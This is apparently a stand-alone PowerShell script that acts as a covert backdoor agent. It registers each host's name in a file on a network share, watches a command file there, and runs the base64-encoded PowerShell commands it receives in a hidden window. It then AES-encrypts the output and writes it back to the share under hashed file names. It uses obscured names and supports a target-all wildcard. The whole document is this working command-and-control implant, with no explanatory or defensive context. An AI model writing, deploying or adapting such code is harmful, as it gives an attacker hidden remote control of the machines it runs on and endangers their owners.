if(1){
$y = '\\folder\place\'
$p = $y+'j'
$r = $y+'woops'
$hihi = (gp $r).lastwritetime
function e($zz){
$d = $zz.m 
$u = New-Object System.Diagnostics.ProcessStartInfo
$u.FileName = 'powershell.exe'
$u.RedirectStandardError = 1
$u.RedirectStandardOutput = 1
$u.UseShellExecute = 0
$u.WindowStyle = 'hidden'
$u.CreateNoWindow = 1
$u.Arguments = '-enc '+$zz.c
$p = New-Object System.Diagnostics.Process
$p.StartInfo = $u
$p.start() | Out-Null
$p.WaitForExit($d) | Out-Null
if($p.HasExited){
$s1 = $p.StandardOutput.ReadToEnd()
$s2 = $p.StandardError.ReadToEnd()
$s1+"`n"+$s2+"`n"+$p.ExitCode
}
else{
'timeout'
}
$p.Dispose()
}

function d(){
$q = gc $p
$l = $env:COMPUTERNAME.tolower()
if($q -notcontains $l){
$l >> $p
}

$x = Import-Clixml $r
$t = $x.t
if(($l -in $t) -or "@ll_0f_1t" -in $t){
    
$c = [text.encoding]::Unicode.getstring([convert]::frombase64string($x.c))
$h = e $x

$u = new-object -typename System.Security.Cryptography.md5CryptoServiceProvider
$f = new-object -typename System.Text.UnicodeEncoding
$i = $u.computehash($f.getbytes($l)) #lol!!!
$b = $u.computehash($f.getbytes($c))*2 #even more lol!


$g = New-Object system.security.cryptography.aesmanaged 
$g.iv = $i
$g.key = $b
$q = $f.getbytes($h)
$z = $g.createencryptor()

$v = [convert]::tobase64string($z.transformfinalblock($q,0,$q.count))
$k = [convert]::tobase64string($b).substring(0,3)+[convert]::tobase64string($i)

$k = $y+[bitconverter]::tostring($u.computehash($f.getbytes($k)))

[io.file]::writealltext($k,$v)
}}while(1){if($hihi -ne (gp $r).lastwritetime){$hihi = (gp $r).lastwritetime;d}sleep 3}}



